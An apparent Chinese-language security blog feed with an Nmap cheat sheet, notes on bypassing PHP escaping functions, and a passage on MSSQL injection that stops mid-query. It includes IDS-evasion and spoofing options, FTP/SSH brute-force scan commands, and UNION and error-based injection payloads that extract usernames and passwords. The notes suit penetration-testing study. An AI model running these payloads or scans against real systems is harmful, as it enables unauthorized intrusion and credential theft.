<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>B.Stark&#39;Blog</title>
  
  
  <link href="https://bstark.me/atom.xml" rel="self"/>
  
  <link href="https://bstark.me/"/>
  <updated>2022-01-23T11:52:50.912Z</updated>
  <id>https://bstark.me/</id>
  
  <author>
    <name>B Stark</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://bstark.me/posts/0/"/>
    <id>https://bstark.me/posts/0/</id>
    <published>2022-01-23T14:22:33.000Z</published>
    <updated>2022-01-23T11:52:50.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nmap-常用命令"><a href="#Nmap-常用命令" class="headerlink" title="Nmap 常用命令"></a>Nmap 常用命令</h2><p><strong>格式：</strong><br><strong>nmap [ &lt;扫描类型&gt; …] [ &lt;选项&gt; ] { &lt;扫描目标说明&gt; }</strong></p><p>Nmap进行完整全面的扫描</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –T4 <span class="operator">-</span>P80 –A –v</span><br></pre></td></tr></table></figure><p>其中-A选项用于使用进攻性（Aggressive）方式扫描；-T4指定扫描过程使用的时序（Timing），总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态,-P指定端口。</p><h2 id="常用扫描"><a href="#常用扫描" class="headerlink" title="常用扫描"></a>常用扫描</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>sV <span class="operator">-</span>sT <span class="operator">-</span>Pn <span class="comment">--open -v 192.168.1.1 不使用ping对ip进行服务识别 使用tcp发包 返回</span></span><br><span class="line">端口开放的结果</span><br><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>Pn <span class="comment">--open -v banner.nse 192.168.1.1 获取服务器的banner信息</span></span><br><span class="line">nmap <span class="operator">-</span>sP <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span><span class="operator">/</span><span class="number">24</span> 判断哪些主机存活</span><br><span class="line">nmap <span class="operator">-</span>sT <span class="number">192.168</span><span class="number">.0</span><span class="number">.3</span> 开放了哪些端口</span><br><span class="line">nmap <span class="operator">-</span>sS <span class="number">192.168</span><span class="number">.0</span><span class="number">.127</span> 开放了哪些端口（隐蔽扫描）</span><br><span class="line">nmap <span class="operator">-</span>sU <span class="number">192.168</span><span class="number">.0</span><span class="number">.127</span> 开放了哪些端口（UDP）</span><br><span class="line">nmap <span class="operator">-</span>sS <span class="operator">-</span>O <span class="number">192.168</span><span class="number">.0</span><span class="number">.127</span> 操作系统识别</span><br><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>p <span class="number">80</span> <span class="operator">-</span>oG – <span class="number">192.168</span><span class="number">.1</span>.<span class="operator">*</span> <span class="operator">|</span> grep <span class="keyword">open</span> 列出开放了指定端口的主机列表</span><br><span class="line">nmap <span class="operator">-</span>sV <span class="operator">-</span>p <span class="number">80</span> baidu.com 列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等)</span><br></pre></td></tr></table></figure><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#主机发现#   选项用于选择不同的 ping 方法</span><br><span class="line">nmap <span class="operator">-</span>sP<span class="operator">/</span><span class="operator">-</span>sn ping扫描存活主机 不进行端口扫描.</span><br><span class="line">nmap <span class="operator">-</span>Pn    不检测主机存活跳过主机发现 直接扫描,也就是没有用到ping</span><br><span class="line">nmap <span class="operator">-</span>PS<span class="operator">/</span>PA<span class="operator">/</span>PU<span class="operator">/</span>PY[portlist] TCP SYN Ping<span class="operator">/</span>TCP ACK Ping<span class="operator">/</span>UDP Ping发现</span><br><span class="line">nmap <span class="operator">-</span>PE<span class="operator">/</span>PP<span class="operator">/</span>PM: 使用ICMP echo, <span class="type">timestamp</span>, <span class="keyword">and</span> netmask 请求包发现主机。</span><br><span class="line">nmap <span class="operator">-</span>PO[protocollist]: 使用IP协议包探测对方主机是否开启。</span><br><span class="line"></span><br><span class="line">nmap <span class="operator">-</span>PO[prococol list] 使用IP协议包探测对方主机是否开启</span><br><span class="line">nmap <span class="operator">-</span>n<span class="operator">/</span><span class="operator">-</span>R 不对IP进行域名反向解析<span class="operator">/</span>为所有的IP都进行域名的反响解析</span><br><span class="line">nmap <span class="comment">--dns-servers &lt;serv1[,serv2],...&gt;: 指定DNS服务器。  </span></span><br><span class="line">nmap <span class="comment">--system-dns: 指定使用系统的DNS服务器  </span></span><br><span class="line">nmap <span class="comment">--traceroute: 追踪每个路由节点 </span></span><br></pre></td></tr></table></figure><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#扫描技术#   检测开放端口的方法(对于确定为在线的主机)</span><br><span class="line">nmap <span class="operator">-</span>sS    SYN扫描 只进行前两次握手  一般不会被日志记录</span><br><span class="line">nmap <span class="operator">-</span>sT    TCP三次握手扫描          会被日志记录</span><br><span class="line">nmap <span class="operator">-</span>sV    端口版本服务信息扫描</span><br><span class="line">nmap <span class="operator">-</span>O     系统版本信息扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span>sA<span class="operator">/</span>sW<span class="operator">/</span>sM TCP SYN<span class="operator">/</span>TCP <span class="keyword">connect</span>()<span class="operator">/</span>ACK<span class="operator">/</span>TCP窗口扫描<span class="operator">/</span>TCP Maimon扫描</span><br><span class="line"><span class="operator">-</span>sU UDP扫描</span><br><span class="line"><span class="operator">-</span>sN<span class="operator">/</span>sF<span class="operator">/</span>sX TCP <span class="keyword">Null</span>，FIN，<span class="keyword">and</span> Xmas扫描</span><br><span class="line"><span class="comment">--scanflags 自定义TCP包中的flags</span></span><br><span class="line"><span class="operator">-</span>sI zombie host[:probeport] Idlescan</span><br><span class="line"><span class="operator">-</span>sY<span class="operator">/</span>sZ SCTP INIT<span class="operator">/</span>COOKIE<span class="operator">-</span>ECHO 扫描</span><br><span class="line"><span class="operator">-</span>sO 使用IP protocol 扫描确定目标机支持的协议类型</span><br><span class="line"><span class="operator">-</span>b “FTP relay host” 使用FTP bounce scan</span><br><span class="line"><span class="comment">--scanflags &lt;flags&gt;: 定制TCP包的flags。  </span></span><br></pre></td></tr></table></figure><h2 id="批量扫描"><a href="#批量扫描" class="headerlink" title="批量扫描"></a>批量扫描</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>sV <span class="operator">-</span>p80<span class="number">-89</span>,<span class="number">8080</span><span class="number">-8099</span>,<span class="number">8000</span><span class="number">-8009</span>,<span class="number">7001</span><span class="number">-7009</span>,<span class="number">9000</span><span class="operator">-</span></span><br><span class="line"><span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">2801</span></span><br><span class="line"><span class="number">7</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">4</span></span><br><span class="line"><span class="number">9705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> <span class="comment">--open --max-hostgroup</span></span><br><span class="line"><span class="number">10</span> <span class="comment">--max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>sT <span class="operator">-</span>sV <span class="operator">-</span>O <span class="operator">-</span>P0 <span class="comment">--open -n -oN result.txt -p80-89,8080-8099,8000-</span></span><br><span class="line"><span class="number">8009</span>,<span class="number">7001</span><span class="number">-7009</span>,<span class="number">9000</span><span class="operator">-</span></span><br><span class="line"><span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">2801</span></span><br><span class="line"><span class="number">7</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">4</span></span><br><span class="line"><span class="number">9705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> <span class="operator">-</span>iL ip.txt</span><br><span class="line"><span class="comment">--open 只输出端口开放的结果 输出到result.txt文件</span></span><br></pre></td></tr></table></figure><h2 id="OS识别"><a href="#OS识别" class="headerlink" title="OS识别"></a>OS识别</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>O 启用操作系统检测,<span class="operator">-</span>A来同时启用操作系统检测和版本检测</span><br><span class="line"><span class="comment">--osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和</span></span><br><span class="line">closed的端口)</span><br><span class="line"><span class="comment">--osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提</span></span><br><span class="line">供最相近的匹配，Nmap默认进行这种匹配</span><br></pre></td></tr></table></figure><h2 id="防火墙-IDS躲避和哄骗"><a href="#防火墙-IDS躲避和哄骗" class="headerlink" title="防火墙/IDS躲避和哄骗"></a>防火墙/IDS躲避和哄骗</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>f; <span class="comment">--mtu value 指定使用分片、指定数据包的MTU.</span></span><br><span class="line"><span class="operator">-</span>D decoy1,decoy2,ME 使用诱饵隐蔽扫描</span><br><span class="line"><span class="operator">-</span>S IP<span class="operator">-</span>ADDRESS 源地址欺骗</span><br><span class="line"><span class="operator">-</span>e interface 使用指定的接口</span><br><span class="line"><span class="operator">-</span>g<span class="operator">/</span> <span class="comment">--source-port PROTNUM 使用指定源端口</span></span><br><span class="line"><span class="comment">--proxies url1,[url2],... 使用HTTP或者SOCKS4的代理</span></span><br><span class="line"><span class="comment">--data-length NUM 填充随机数据让数据包长度达到NUM</span></span><br><span class="line"><span class="comment">--ip-options OPTIONS 使用指定的IP选项来发送数据包</span></span><br><span class="line"><span class="comment">--ttl VALUE 设置IP time-to-live域</span></span><br><span class="line"><span class="comment">--spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装</span></span><br><span class="line"><span class="comment">--badsum 使用错误的checksum来发送数据包</span></span><br></pre></td></tr></table></figure><h2 id="Nmap输入"><a href="#Nmap输入" class="headerlink" title="Nmap输入"></a>Nmap输入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="operator">-</span>iL ip.txt  从文件加载目标扫描</span><br></pre></td></tr></table></figure><h2 id="Nmap输出"><a href="#Nmap输出" class="headerlink" title="Nmap输出"></a>Nmap输出</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span><span class="keyword">oN</span> 将标准输出直接写入指定的文件</span><br><span class="line"><span class="operator">-</span>oX 输出xml文件</span><br><span class="line"><span class="operator">-</span>oS 将所有的输出都改为大写</span><br><span class="line"><span class="operator">-</span>oG 输出便于通过bash或者perl处理的格式,非xml</span><br><span class="line"><span class="operator">-</span>oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出</span><br><span class="line"><span class="operator">-</span>v 提高输出信息的详细度</span><br><span class="line"><span class="operator">-</span>d level 设置debug级别,最高是<span class="number">9</span></span><br><span class="line"><span class="comment">--reason 显示端口处于带确认状态的原因</span></span><br><span class="line"><span class="comment">--open 只输出端口状态为open的端口</span></span><br><span class="line"><span class="comment">--packet-trace 显示所有发送或者接收到的数据包</span></span><br><span class="line"><span class="comment">--iflist 显示路由信息和接口,便于调试</span></span><br><span class="line"><span class="comment">--log-errors 把日志等级为errors/warings的日志输出</span></span><br><span class="line"><span class="comment">--append-output 追加到指定的文件</span></span><br><span class="line"><span class="comment">--resume FILENAME 恢复已停止的扫描</span></span><br><span class="line"><span class="comment">--stylesheet PATH/URL 设置XSL样式表，转换XML输出</span></span><br><span class="line"><span class="comment">--webxml 从namp.org得到XML的样式</span></span><br><span class="line"><span class="comment">--no-sytlesheet 忽略XML声明的XSL样式表</span></span><br></pre></td></tr></table></figure><h2 id="其他nmap选项"><a href="#其他nmap选项" class="headerlink" title="其他nmap选项"></a>其他nmap选项</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-6</span> 开启IPv6</span><br><span class="line"><span class="operator">-</span>A OS识别,版本探测,脚本扫描和traceroute</span><br><span class="line"><span class="comment">--datedir DIRNAME 说明用户Nmap数据文件位置</span></span><br><span class="line"><span class="comment">--send-eth / --send-ip 使用原以太网帧发送/在原IP层发送</span></span><br><span class="line"><span class="comment">--privileged 假定用户具有全部权限</span></span><br><span class="line"><span class="comment">--unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限</span></span><br><span class="line"><span class="operator">-</span>V 打印版本信息</span><br><span class="line"><span class="operator">-</span>h 输出帮助<span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure><h2 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-sC 根据端口识别的服务,调用默认脚本</span><br><span class="line">--script=”Lua scripts” 调用的脚本名</span><br><span class="line">--script-args=n1=v1,[n2=v2] 调用的脚本传递的参数</span><br><span class="line">--script-args-file=filename 使用文本传递参数</span><br><span class="line">--script-trace 显示所有发送和接收到的数据</span><br><span class="line">--script-updatedb 更新脚本的数据库</span><br><span class="line">--script-help=”Lua script” 显示指定脚本的帮助</span><br><span class="line">nmap -sV --script=ssl-heartbleed target_ip 扫描心脏滴血漏洞</span><br><span class="line">nmap -p 6379 --script redis-info target_ip扫描redis未授权访问漏洞</span><br><span class="line">nmap -p 27017 --script mongodb-info target_ip 扫描mongodb未授权访问漏洞</span><br><span class="line">nmap -p 21 --script ftp-anon.nse -v target_ip 扫描ftp匿名访问的漏洞</span><br><span class="line">nmap -p 21 --script ftp-brute.nse -v target_ip 对目标IP进行ftp弱口令爆破</span><br><span class="line">nmap -p 22 --script ssh-brute.nse -v target_ip 对目标IP进行ssh口令爆破</span><br><span class="line">nmap -p445 –script smb-vuln-ms17-010 target_ip/mask 对目标网段进行永恒之蓝漏洞扫描</span><br><span class="line">nmap --script参数使用。 写出示例，扫描心脏滴血，扫描redis未授权，扫描ftp匿名访问，扫描永恒之蓝</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Nmap-常用命令&quot;&gt;&lt;a href=&quot;#Nmap-常用命令&quot; class=&quot;headerlink&quot; title=&quot;Nmap 常用命令&quot;&gt;&lt;/a&gt;Nmap 常用命令&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;格式：&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;nmap [ &amp;lt</summary>
      
    
    
    
    
    <category term="命令" scheme="https://bstark.me/tags/%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>php安全函数绕过</title>
    <link href="https://bstark.me/posts/17844/"/>
    <id>https://bstark.me/posts/17844/</id>
    <published>2022-01-23T12:20:20.000Z</published>
    <updated>2022-01-23T11:58:18.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="待补充————————"><a href="#待补充————————" class="headerlink" title="待补充————————"></a>待补充————————</h1><p>get_magic_quotes_runtime()    // php.ini文件</p><p>二次注入</p><p>mysql_escape_string()</p><p>二次注入</p><p>mysql_real_escape_string()</p><p>addslashes()</p><p>编码注入</p><p>1.将字符串转为16进制编码数据或使用char函数（十进制）进行转化（因为数据库会自动把16进制转化）<br>2.用注释符去掉输入密码部分如”–/*#”</p><p>二次注入</p><p>宽字节注入</p><p>htmlspecialchars()</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;待补充————————&quot;&gt;&lt;a href=&quot;#待补充————————&quot; class=&quot;headerlink&quot; title=&quot;待补充————————&quot;&gt;&lt;/a&gt;待补充————————&lt;/h1&gt;&lt;p&gt;get_magic_quotes_runtime()    // p</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://bstark.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>MSSQL注入及提权</title>
    <link href="https://bstark.me/posts/26454/"/>
    <id>https://bstark.me/posts/26454/</id>
    <published>2022-01-23T04:20:20.000Z</published>
    <updated>2022-01-23T05:13:56.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h2><ul><li><strong>固定服务器角色</strong></li></ul><table><thead><tr><th>固定服务器</th><th>角色说明</th></tr></thead><tbody><tr><td>sysadmin</td><td>执行SQLServer中的任何动作</td></tr><tr><td>serveradmin</td><td>配置服务器设置</td></tr><tr><td>setupadmin</td><td>安装复制和管理扩展过程</td></tr><tr><td>securityadmin</td><td>管理登录和CREATEDATABASE的权限以及阅读审计</td></tr><tr><td>processadmin</td><td>管理SQLServer进程</td></tr><tr><td>dbcreator</td><td>创建和修改数据库</td></tr><tr><td>diskadmin</td><td>管理磁盘文件</td></tr></tbody></table><ul><li><strong>固定数据库角色</strong></li></ul><table><thead><tr><th>固定数据库</th><th>角色说明</th></tr></thead><tbody><tr><td>db_owner</td><td>可以执行数据库中技术所有动作的用户</td></tr><tr><td>db_accessadmin</td><td>可以添加、删除用户的用户</td></tr><tr><td>db_datareader</td><td>可以查看所有数据库中用户表内数据的用户</td></tr><tr><td>db_datawriter</td><td>可以添加、修改或删除所有数据库中用户表内数据的用户</td></tr><tr><td>db_ddladmin</td><td>可以在数据库中执行所有DDL操作的用户</td></tr><tr><td>db_securityadmin</td><td>可以管理数据库中与安全权限有关所有动作的用户</td></tr><tr><td>db_backoperator</td><td>可以备份数据库的用户</td></tr><tr><td>db_denydatareader</td><td>不能看到数据库中任何数据的用户</td></tr><tr><td>db_denydatawriter</td><td>不能改变数据库中任何数据的用户</td></tr></tbody></table><h2 id="Mssql注入"><a href="#Mssql注入" class="headerlink" title="Mssql注入"></a>Mssql注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- # 注释符号</span></span><br><span class="line">;<span class="operator">%</span><span class="number">00</span>      注释符号</span><br><span class="line"><span class="comment">/* 注释符号</span></span><br><span class="line"><span class="comment">/**/</span>            空白字符</span><br><span class="line"><span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="number">0</span>F,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span>         空白字符</span><br><span class="line">@<span class="variable">@version</span>版本信息</span><br><span class="line">db_name()当前数据库名</span><br><span class="line">user_name()     当前用户名</span><br><span class="line">host_name()当前服务器名</span><br><span class="line">@<span class="variable">@servername</span>    当前服务器名</span><br><span class="line">;<span class="keyword">select</span> <span class="keyword">user</span>    查询是否支持多语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> info <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> host_name()<span class="operator">=</span>@<span class="variable">@servername</span>;<span class="comment">--&#x27;  判断是否站库分离</span></span><br></pre></td></tr></table></figure><ul><li><strong>注入的主要视图表</strong></li></ul><p>每个数据库下面都有一个视图表,需要跨库查需要前面加库名 如master.information_schema.tables</p><table><thead><tr><th>视图表</th><th>列名</th><th>说明</th></tr></thead><tbody><tr><td>sys.databases</td><td>name</td><td>SQL server中所有的数据库</td></tr><tr><td>information_schema.tables</td><td>table_name</td><td>SQL server中当前用户数据库的表</td></tr><tr><td>information_schema.columns</td><td>column_name,table_name</td><td>SQLserver中当前用户数据库的列</td></tr><tr><td>sys.sql_logins</td><td></td><td>SQL server中所有的登录名</td></tr></tbody></table><ul><li><strong>注入的权限判断</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(selectis_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>))</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(selectis_member(<span class="string">&#x27;db_owner&#x27;</span>))</span><br></pre></td></tr></table></figure></li><li><strong>判断是否为MSSQL数据库</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects)      返回正常为mssql数据库</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sysobjects)  返回正常为mssql数据库</span><br></pre></td></tr></table></figure></li></ul><h3 id="联合注入过程"><a href="#联合注入过程" class="headerlink" title="联合注入过程"></a>联合注入过程</h3><p>mssql联合注入我们一般不使用 数字占位，而是null.因为你使用数字占位可能会发生隐式转换</p><ol><li>获取当前数据库版本<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,@@version</span></span><br></pre></td></tr></table></figure></li><li>获取当前数据库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,db_name() --</span></span><br></pre></td></tr></table></figure></li><li>获取所有数据库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,name from master.sys.databases where name not in (select top 1 name from master.sys.database) --</span></span><br></pre></td></tr></table></figure></li><li>获取表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables) --</span></span><br></pre></td></tr></table></figure></li><li>获取列名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and column_name not in (select top 0 column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;) --</span></span><br></pre></td></tr></table></figure></li><li>获取数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,username,password from user where username not in (select top 1 username from user) and password not in(select top 1 password from user)--</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="报错注入过程"><a href="#报错注入过程" class="headerlink" title="报错注入过程"></a>报错注入过程</h3><ol><li>判断版本号<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> @<span class="variable">@version</span><span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></li><li>获取当前数据库&amp;当前用户名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> db_name<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> (<span class="keyword">select</span> db_name())<span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> user_name<span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></li><li>获取所有数据库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> name <span class="keyword">from</span> master.sys.databases <span class="keyword">where</span> database_id<span class="operator">=</span><span class="number">1</span>)<span class="operator">&gt;</span><span class="number">0</span> <span class="operator">/</span><span class="operator">/</span>取库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> 